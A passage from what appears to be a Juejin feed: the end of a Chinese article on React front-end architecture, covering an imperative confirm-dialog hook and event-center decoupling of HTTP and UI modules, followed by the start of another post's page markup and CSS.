  <span class="hljs-keyword">return</span> filteredData.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;
}, [filteredData]);

<span class="hljs-comment">// 视图层直接消费这些数据即可</span>
</code></pre>
<h2 data-id="heading-2">业务逻辑应当是命令式代码</h2>
<p>业务逻辑应该是命令式的，而在的如今的前端开发中，很多时候我们使用了声明式的代码来编写逻辑，导致产生一种难以名状的奇怪状态写法。例如，在React中，我们需要实现一个二次确认的提交表单的功能，一般来说，会写成这样。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SomeForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [open, setOpen] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">address</span>: <span class="hljs-string">''</span>,
  });
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">submit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">event: React.FormEvent&lt;HTMLFormElement&gt;</span>) =&gt; {
    event.<span class="hljs-title function_">preventDefault</span>();

    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(event.<span class="hljs-property">target</span>));
    <span class="hljs-title function_">setFormData</span>(data);
    <span class="hljs-title function_">setOpen</span>(<span class="hljs-literal">true</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">realSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">HttpClient</span>.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/some-form'</span>, formData);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Fragment</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{submit}</span>&gt;</span>
        {/* some form fields */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Dialog</span> <span class="hljs-attr">open</span>=<span class="hljs-string">{open}</span> <span class="hljs-attr">onClose</span>=<span class="hljs-string">{()</span> =&gt;</span> setOpen(false)}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogTitle</span>&gt;</span>确认提交<span class="hljs-tag">&lt;/<span class="hljs-name">DialogTitle</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogContent</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">DialogContentText</span>&gt;</span>
            确认提交表单吗？
          <span class="hljs-tag">&lt;/<span class="hljs-name">DialogContentText</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DialogContent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogActions</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setOpen(false)}&gt;取消<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> realSubmit()}&gt;确认<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DialogActions</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Dialog</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Fragment</span>&gt;</span></span>
  )
}
</code></pre>
<p>真的，很不直观。声明式代码不应该把单一逻辑处理处理成多个状态的切换，上面的做法太丑陋了。尽管我们通过 ViewModel 把视图层的命令式代码替代掉，但并不意味着你处处都需要用命令式代码。再说一遍，业务逻辑需要是命令式的代码。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SomeForm</span>(<span class="hljs-params"/>) {

  <span class="hljs-keyword">const</span> { dialog, contextHolder } = <span class="hljs-title function_">useDialog</span>();

  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">address</span>: <span class="hljs-string">''</span>,
  });
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">submit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">event: React.FormEvent&lt;HTMLFormElement&gt;</span>) =&gt; {
    event.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-keyword">const</span> confirm = <span class="hljs-keyword">await</span> dialog.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">'确认提交表单吗？'</span>);
    <span class="hljs-keyword">if</span> (!confirm) {
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(event.<span class="hljs-property">target</span>));
    <span class="hljs-title function_">setFormData</span>(data);
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">HttpClient</span>.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/some-form'</span>, formData);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Fragment</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{submit}</span>&gt;</span>
        {/* some form fields */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
      {contextHolder}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Fragment</span>&gt;</span></span>
  )
}
</code></pre>
<p>至于里面的 useDialog，我使用 <code>Promise.withResolvers()</code> 写了个参考写法。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PromiseResolvers</span>&lt;T&gt; {
  <span class="hljs-attr">promise</span>: <span class="hljs-title class_">Promise</span>&lt;T&gt;;
  <span class="hljs-attr">resolve</span>: <span class="hljs-function">(<span class="hljs-params">value: T | PromiseLike&lt;T&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-attr">reject</span>: <span class="hljs-function">(<span class="hljs-params">reason?: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useDialog</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [open, setOpen] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> resolversRef = <span class="hljs-title class_">React</span>.<span class="hljs-property">useRef</span>&lt;<span class="hljs-title class_">PromiseResolvers</span>&lt;<span class="hljs-built_in">boolean</span>&gt;&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClose</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setOpen</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-keyword">if</span> (!resolversRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">return</span>;
    }
    resolversRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>);
    resolversRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>;
  }
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleConfirm</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setOpen</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-keyword">if</span> (!resolversRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">return</span>;
    }
    resolversRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>);
    resolversRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>;
  }
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">contextHolder</span>: (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Dialog</span> <span class="hljs-attr">open</span>=<span class="hljs-string">{open}</span> <span class="hljs-attr">onClose</span>=<span class="hljs-string">{handleClose}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogTitle</span>&gt;</span>确认提交<span class="hljs-tag">&lt;/<span class="hljs-name">DialogTitle</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogContent</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">DialogContentText</span>&gt;</span>
            确认提交表单吗？
          <span class="hljs-tag">&lt;/<span class="hljs-name">DialogContentText</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DialogContent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DialogActions</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleClose}</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleConfirm}</span>&gt;</span>确认<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DialogActions</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Dialog</span>&gt;</span></span>
    ),
    <span class="hljs-attr">confirm</span>: <span class="hljs-function">(<span class="hljs-params">message: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
      <span class="hljs-title function_">setOpen</span>(<span class="hljs-literal">true</span>);
      resolversRef.<span class="hljs-property">current</span> = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">withResolvers</span>();
      <span class="hljs-keyword">return</span> resolversRef.<span class="hljs-property">current</span>.<span class="hljs-property">promise</span>;
    },
  }  
}
</code></pre>
<p>可以看到，上面的代码更加直观，阅读也容易理解，出错也容易排查。</p>
<h2 data-id="heading-3">解耦模块间的依赖</h2>
<p>在响应式编程中，数据流是<strong>单向的</strong>；而我们在开发项目过程中，模块中的引用也应该是<strong>单向的</strong>。
解耦模块间的双向依赖其实可以使用以下两种方式实现：</p>
<ol>
<li>事件订阅模式</li>
<li>依赖注入模式</li>
</ol>
<p>下面仅以事件订阅模式为例，展示如何解耦模块间的依赖。</p>
<h3 data-id="heading-4">例子</h3>
<p>有一种很流行的设计，喜欢把网络请求模块和UI模块结合在一起。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// user-info.page.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">HttpService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/http-service'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfoPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">address</span>: <span class="hljs-string">''</span>,
  });

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">submit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">HttpService</span>.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/user-info'</span>, formData);
  };

  <span class="hljs-comment">//...</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    {/*...*/}
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{submit}</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// ./http.service.ts</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Message</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/ui'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">url, data</span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(url, data);
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> !== <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">throw</span> response;
    }
    <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'提交成功'</span>);
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error &amp;&amp; error.<span class="hljs-property">status</span> === <span class="hljs-number">403</span>) {
      <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'提交失败，权限不足'</span>);
      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">'/login'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"提交失败"</span>);
    }
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">HttpService</span> = {
  post,
}

</code></pre>
<p>当用户点击提交按钮时，数据被发送，并且会提示用户提交成功或者失败；当用户token失效时，会自动跳转到登录页。这种写法把网络请求和UI逻辑耦合了起来。在依赖层面看来，已经开始有点 bad-smell 了。</p>
<p>如何解决呢？实际上，网络请求不应该知道具体UI的逻辑。网络请求模块只需要提供一个事件系统，处理请求中不同的状态。UI模块只需要订阅这些事件，就可以知道本次请求的状态。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// event-center.ts</span>
<span class="hljs-comment">// 事件中心</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Event</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createEventCenter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> subjects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Event</span>[]&gt;();

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">subscribe</span>(<span class="hljs-params">eventName: <span class="hljs-built_in">string</span>, fn: Event</span>) {
    <span class="hljs-keyword">let</span> fns = subjects.<span class="hljs-title function_">get</span>(eventName);
    <span class="hljs-keyword">if</span> (!fns) {
      fns = [];
      subjects.<span class="hljs-title function_">set</span>(eventName, fns);
    }
    fns.<span class="hljs-title function_">push</span>(fn);

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> index = fns.<span class="hljs-title function_">indexOf</span>(fn);
      <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) {
        <span class="hljs-keyword">return</span>;
      }
      fns.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
    }
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">eventName: <span class="hljs-built_in">string</span>, ...args: <span class="hljs-built_in">any</span>[]</span>) {
    <span class="hljs-keyword">const</span> fns = subjects.<span class="hljs-title function_">get</span>(eventName);
    <span class="hljs-keyword">if</span> (fns) {
      fns.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>(...args));
    }
  }

  <span class="hljs-keyword">return</span> {
    emit,
    subscribe,
  }
}
</code></pre>
<p>http请求模块引入上面的事件中心。</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-comment">// http-client.ts</span>
<span class="hljs-comment">// 事件中心</span>
<span class="hljs-keyword">const</span> eventCenter = <span class="hljs-title function_">createEventCenter</span>();
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">url, data</span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(url, data);
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> !== <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">throw</span> response;
    }
    eventCenter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'REQUEST_SUCCESS'</span>, response.<span class="hljs-property">data</span>);
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error &amp;&amp; error.<span class="hljs-property">status</span> === <span class="hljs-number">403</span>) {
      eventCenter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'NO_PERMISSION'</span>, response.<span class="hljs-property">data</span>);
    } <span class="hljs-keyword">else</span> {
      eventCenter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'REQUEST_ERROR'</span>);
    }
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">subscribe</span>(<span class="hljs-params">eventName: <span class="hljs-built_in">string</span>, fn: Event</span>) {
  eventCenter.<span class="hljs-title function_">subscribe</span>(eventName, fn);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">HttpService</span> = {
  post,
  subscribe,
}

</code></pre>
<p>最后，UI模块订阅来自网络模块的事件。</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-comment">// app.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">HttpClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/http-client'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Message</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/ui'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> subs = [
      <span class="hljs-title class_">HttpClient</span>.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'NO_PERMISSION'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">navigate</span>(<span class="hljs-string">'/login'</span>);
      }),
      <span class="hljs-title class_">HttpClient</span>.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'REQUEST_ERROR'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"提交失败"</span>);
      }),
      <span class="hljs-title class_">HttpClient</span>.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'REQUEST_SUCCESS'</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
        <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"提交成功"</span>);
      }),
    ];
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      subs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">sub</span> =&gt;</span> <span class="hljs-title function_">sub</span>());
    }
  }, []);
  
  <span class="hljs-comment">// rest code ...</span>
}

</code></pre>
<p>这样，UI模块就只需要订阅来自网络模块的事件。而网络模块也依赖UI模块，调试起来也会方便很多。这个思路可扩展各个不同模块之间的通信，这就解耦了不同模块间的依赖。</p>
<h2 data-id="heading-5">总结</h2>
<p>前端开发的核心在于理解框架本质与代码组织方式。现代前端框架本质上是<strong>响应式的视图框架</strong>。为了编写高质量代码，建议遵循以下原则：</p>
<ol>
<li><strong>关注数据流</strong>：利用响应式编程思想，通过定义数据间的依赖关系（管道）来自动流转数据，而非手动调度更新。这能让代码更具声明式特征，减少副作用。</li>
<li><strong>保持业务逻辑命令式</strong>：虽然视图更新是响应式的，但对于线性的业务流程（如“点击按钮 -&gt; 二次确认 -&gt; 提交数据”），应保持命令式的逻辑编写方式。避免为了迎合框架而过度拆分状态（如设置多个 <code>open</code> 状态位），导致逻辑分散和难以追踪。</li>
<li><strong>解耦模块依赖</strong>：使用订阅发布模式（Event Center）分离业务逻辑（如网络请求）与视图层。UI 只需响应状态变化，无需关心具体请求逻辑，从而降低耦合度，提升可维护性。</li>
</ol>
<p>通过平衡声明式的数据流与命令式的业务逻辑，可以构建出更清晰、易维护且逻辑自洽的前端应用。</p>
<h2 data-id="heading-6">参考文献</h2>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffolk.universitetetioslo.no%2Ftrygver%2Fthemes%2Fmvc%2Fmvc-index.html" target="_blank" title="https://folk.universitetetioslo.no/trygver/themes/mvc/mvc-index.html" ref="nofollow noopener noreferrer">MVC XEROX PARC 1978-79</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wildcrest.com%2FPotel%2FPortfolio%2Fmvp.pdf" target="_blank" title="https://www.wildcrest.com/Potel/Portfolio/mvp.pdf" ref="nofollow noopener noreferrer">MVP: Model-View-Presenter The Taligent Programming Model for C++ and Java</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Farchive%2Fblogs%2Fjohngossman%2Fintroduction-to-modelviewviewmodel-pattern-for-building-wpf-apps" target="_blank" title="https://learn.microsoft.com/en-us/archive/blogs/johngossman/introduction-to-modelviewviewmodel-pattern-for-building-wpf-apps" ref="nofollow noopener noreferrer">Introduction to Model/View/ViewModel pattern for building WPF apps</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ReactNative 使用百分比宽度时，aspectRatio 在某些情况下无法正确推断出高度，导致图片高度为 0，从而无法显示]]></title>    <link>https://juejin.cn/post/7594276252460269578</link>    <guid>https://juejin.cn/post/7594276252460269578</guid>    <pubDate>2026-01-12T12:56:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594276252460269578" data-draft-id="7594309641866346534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ReactNative 使用百分比宽度时，aspectRatio 在某些情况下无法正确推断出高度，导致图片高度为 0，从而无法显示"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-12T12:56:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大喜xi"/> <meta itemprop="url" content="https://juejin.cn/user/3336389407020820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ReactNative 使用百分比宽度时，aspectRatio 在某些情况下无法正确推断出高度，导致图片高度为 0，从而无法显示
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336389407020820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大喜xi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:56:23.000Z" title="Mon Jan 12 2026 12:56:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 